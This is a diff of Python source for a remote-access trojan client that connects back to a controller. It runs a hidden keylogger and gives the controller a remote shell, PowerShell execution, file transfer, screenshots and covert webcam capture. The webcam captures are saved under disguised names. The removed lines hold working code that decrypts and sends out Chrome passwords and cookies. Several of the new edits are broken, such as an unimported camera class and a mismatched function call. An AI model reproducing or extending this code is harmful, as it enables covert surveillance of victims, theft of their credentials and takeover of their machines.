@@ -1,22 +1,21 @@
 import socket
 import subprocess
+from time import sleep
 import os
+from PIL import ImageGrab
+import cv2
+from numpy import array
 import threading
 import pickle
-import sqlite3
-import base64
-import json
-import ctypes
-from Crypto.Cipher import AES
-from time import sleep
-from sys import _MEIPASS
-from PIL import ImageGrab
 from module import kizagan_key
+from sys import _MEIPASS
+
 
 key = kizagan_key.kizagan_key()
 key_thread = threading.Thread(target=key.start_key)
 key_thread.start()
 key_state = "true"
+
 
 class Client():
     def __init__(self):
@@ -27,77 +26,43 @@ class Client():
         self.connection = connection
         if os.name == "nt":
             self.ss_path = os.environ["appdata"] + "\\windows_service.png"
+            self.cam_path = os.environ["appdata"] + "\\windows_update.png"
         else:
             self.ss_path = "/tmp/linux_service.png"
+            self.cam_path = "/tmp/linux_update.png"
         self.key_path = key.key_file
-    
-    def get_chrome_passwords(self):
+    def execute_powershell(self, command):
         try:
-            # Path to the Chrome login data
-            login_db = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\Default\Login Data')
-            conn = sqlite3.connect(login_db)
-            cursor = conn.cursor()
-
-            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-            for url, user_name, pwd in cursor.fetchall():
-                decrypted_pwd = self.decrypt_chrome_value(pwd)
-                self.connection.send(f"URL: {url}\nUsername: {user_name}\nPassword: {decrypted_pwd}".encode())
-            
-            conn.close()
+            # Execute PowerShell command and capture output
+            process = subprocess.Popen(["powershell", "-Command", command],
+                                       stdout=subprocess.PIPE,
+                                       stderr=subprocess.PIPE,
+                                       stdin=subprocess.PIPE,
+                                       text=True)
+            stdout, stderr = process.communicate()
+            if stderr:
+                return f"Error: {stderr}"
+            return stdout
         except Exception as e:
-            self.connection.send(f"Error: {str(e)}".encode())
+            return f"Error: {str(e)}"
 
-    def get_chrome_cookies(self):
-        try:
-            # Path to the Chrome Cookies data
-            cookies_db = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\Default\Network\Cookies')
-            conn = sqlite3.connect(cookies_db)
-            cursor = conn.cursor()
-
-            cursor.execute("SELECT host_key, name, path, encrypted_value FROM cookies")
-            for host, name, path, encrypted_value in cursor.fetchall():
-                decrypted_value = self.decrypt_chrome_value(encrypted_value)
-                self.connection.send(f"Host: {host}\nName: {name}\nPath: {path}\nValue: {decrypted_value}".encode())
-            
-            conn.close()
-        except Exception as e:
-            self.connection.send(f"Error: {str(e)}".encode())
-
-    def decrypt_chrome_value(self, encrypted_value):
-        try:
-            # If the encrypted value starts with "v10", it uses the new encryption method
-            if encrypted_value[:3] == b'v10':
-                encrypted_value = encrypted_value[3:]  # Skip the "v10" prefix
-                cipher = AES.new(self.get_encryption_key(), AES.MODE_GCM, nonce=encrypted_value[:12])
-                decrypted_value = cipher.decrypt(encrypted_value[12:]).rstrip(b"\x00").decode()
-            else:
-                # For older versions, use CryptUnprotectData
-                decrypted_value = ctypes.windll.crypt32.CryptUnprotectData(
-                    ctypes.byref(ctypes.c_wchar_p(encrypted_value)),
-                    None, None, None, 0)[1].decode()
-
-            return decrypted_value
-        except Exception as e:
-            return f"Error decrypting: {str(e)}"
-
-    def get_encryption_key(self):
-        try:
-            # Get Chrome's local state file which contains the key
-            local_state_path = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\Local State')
-            with open(local_state_path, 'r', encoding='utf-8') as file:
-                local_state = json.loads(file.read())
-
-            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
-            decrypted_key = ctypes.windll.crypt32.CryptUnprotectData(
-                ctypes.byref(ctypes.c_wchar_p(encrypted_key[5:])),
-                None, None, None, 0)[1].decode()
-            
-            return decrypted_key 
-        except Exception as e:
-            return f"Error retrieving encryption key: {str(e)}"
-
+    def handle_commands(self):
+        while True:
+            try:
+                command = self.connection.recv(1024).decode()
+                if command == "exit":
+                    break
+                elif command.startswith("powershell "):
+                    # Execute PowerShell command
+                    ps_command = command[len("powershell "):]
+                    output = self.execute_powershell(ps_command)
+                    self.connection.send(output.encode())
+                else:
+                    self.connection.send("Unknown command".encode())
+            except Exception as e:
+                self.connection.send(f"Error: {str(e)}".encode())
     def download_file(self, file, operation=None):
-        if operation is None:
+        if operation == None:
             file_ = open(file, "rb")
             file_size = len(file_.read())
             file_.close()
@@ -109,6 +74,20 @@ class Client():
                 self.connection.send(file_content)
                 file_content = file_.read(1024)
             file_.close()
+        elif operation == "cam stream":
+            img = pickle.dumps(file)
+            img_size = len(img)
+            self.connection.send(str(img_size).encode())
+            size_output = self.connection.recv(1024).decode()
+            if size_output == "get_size":
+                self.connection.send(img)
+                img_output = self.connection.recv(1024).decode()
+                if not img_output == "get_img":
+                    return "cam_finish"
+                else:
+                    return "cam_continue"
+            else:
+                return "cam_finish"
         elif operation == "screen stream":
             frame = pickle.dumps(file)
             frame_size = len(frame)
@@ -123,28 +102,30 @@ class Client():
                     return "screen_continue"
             else:
                 return "screen_finish"
-
-    def upload_file(self, file):
-        file_size = self.connection.recv(1024).decode()
-        if file_size == "upload_error":
-            return 0
-        file_size = int(file_size)
+        
+    def upload_file(self, file_path):
         try:
-            uploaded_file = open(file, "wb")
-            self.connection.send("upload_path_found".encode())
-        except:
-            self.connection.send("upload_path_error".encode())
-            return 0
-        file_content = self.connection.recv(1024)
-        received_bytes = len(file_content)
-        while file_content:
-            uploaded_file.write(file_content)
-            if file_size > received_bytes:
-                file_content = self.connection.recv(1024)
-                received_bytes = received_bytes + len(file_content)
-            else:
-                uploaded_file.close()
-                break
+            if not os.path.isfile(file_path):
+                print("File does not exist.")
+                self.connection.send("upload_error".encode())
+                return
+
+            file_size = os.path.getsize(file_path)
+            with open(file_path, "rb") as file_:
+                self.connection.send(str(file_size).encode())
+                self.connection.recv(1024).decode()  # Wait for client to confirm
+
+                file_content = file_.read(1024)
+                while file_content:
+                    self.connection.send(file_content)
+                    file_content = file_.read(1024)
+
+            print(f"File {file_path} uploaded successfully.")
+        except Exception as e:
+            print(f"Error during file upload: {e}")
+            self.connection.send("upload_error".encode())
+
+
 
     def screenshot(self):
         try:
@@ -171,6 +152,53 @@ class Client():
                     return 0
             except:
                 self.connection.send("screen_error".encode())
+        
+    def get_cam_list(self, platform):
+        if platform == "nt":
+            cam_list = "Available Camera Index\n----------------------\n"
+            devices = FilterGraph().get_input_devices()
+            for device_index, device_name in enumerate(devices):
+                cam_list = cam_list + f"CAMERA INDEX:[{device_index}]\t{device_name}\n"
+            self.connection.send(cam_list.encode())
+        else:
+            index = 0
+            i = 10
+            cam_list = "Available Camera Index\n----------------------\n"
+            while i > 0:
+                cam = cv2.VideoCapture(index)
+                if cam.read()[0]:
+                    cam_list = cam_list + f"CAMERA_INDEX:[{index}]\n"
+                    cam.release()
+                index += 1
+                i -= 1
+            self.connection.send(cam_list.encode())
+
+    def cam_snapshot(self, cam_index):
+        camera = cv2.VideoCapture(cam_index)
+        result, image = camera.read()
+        if result:
+            cv2.imwrite(self.cam_path, image)
+            camera.release()
+            self.connection.send("camera_success".encode())
+            try:
+                self.download_file(self.cam_path)
+                os.remove(self.cam_path)
+            except:
+                self.connection.send("download_error".encode())
+        else:
+            self.connection.send("camera_error".encode())
+
+    def cam_stream(self, cam_index): # ata aranacak.
+        camera = cv2.VideoCapture(cam_index)
+        while True:
+            result, frame = camera.read()
+            if result:
+                cam_output = self.download_file(frame, "cam stream")
+                if cam_output == "cam_finish":
+                    camera.release()
+                    return 0
+            else:
+                self.connection.send("camera_error".encode())
 
     def get_microphone_list(self):
         mic_list = "Available Microphone Index\n----------------------\n"
@@ -212,7 +240,7 @@ class Client():
                     self.connection.send(f"cd_success:cd_delimiter:{os.getcwd()}".encode())
                 except:
                     self.connection.send("cd_error".encode())
-            elif command == "pwd":
+            elif shell_command == "pwd":
                 try:
                     pwd = os.getcwd()
                     self.connection.send(pwd.encode())
@@ -248,7 +276,19 @@ class Client():
                 except:
                     self.connection.send("download_error".encode())
             elif splitted_shell_command[0] == "upload" and len(splitted_shell_command) > 1:
-                self.upload_file(splitted_shell_command[2])
+                if len(splitted_shell_command) > 2:
+                # Client provides both file path and save path
+                    file_path = splitted_shell_command[1]
+                    save_path = splitted_shell_command[2]
+                else:
+                # Client provides only file path; default save path to file name
+                    file_path = splitted_shell_command[1]
+                    save_path = os.path.basename(file_path)
+
+            # Inform client to start the upload
+                    self.connection.send(f"upload {file_path} {save_path}".encode())
+                    upload_output = self.upload_file(file_path, save_path)
+                    print(upload_output)
             else:
                 try:
                     shell_command_output = subprocess.check_output(shell_command, shell=True, encoding="Latin1")
@@ -265,16 +305,29 @@ class Client():
             splitted_command = command.split(" ")
             if command == "shell":
                 self.shell()
+            elif command =="powershell":
+                self.handle_commands()
+
             elif command == "screen_shot":
                 self.screenshot()
             elif command == "screen_stream":
                 self.screen_stream()
+            elif command == "cam_list":
+                self.get_cam_list(os.name)
+            elif splitted_command[0] == "cam_snapshot" and len(splitted_command) > 1:
+                try:
+                    cam_index = int(splitted_command[1])
+                    self.cam_snapshot(cam_index)
+                except ValueError:
+                    self.connection.send("camera_error".encode())
+            elif splitted_command[0] == "cam_stream" and len(splitted_command) > 1:
+                try:
+                    cam_index = int(splitted_command[1])
+                    self.cam_stream(cam_index)
+                except ValueError:
+                    self.connection.send("camera_error".encode())
             elif command == "mic_list":
                 self.get_microphone_list()
-            elif command == "get_passwords":
-                self.get_chrome_passwords()
-            elif command == "get_cookies":
-                self.get_chrome_cookies()
             elif command == "start_key":
                 key = kizagan_key.kizagan_key()
                 key_thread = threading.Thread(target=key.start_key)
@@ -288,8 +341,9 @@ class Client():
             elif command == "exit":
                 return 0
 
+
 def open_merge_file(merge_file):
-    merge_file = _MEIPASS + f"\\{{merge_file}}"
+    merge_file = _MEIPASS + f"\\\{merge_file}"
     subprocess.Popen(merge_file, shell=True)
 
 def try_connection():
@@ -298,6 +352,4 @@ def try_connection():
             sleep(3)
             Client().main()
         except:
-            try_connection() 
-
-try_connection()
+            try_connection()
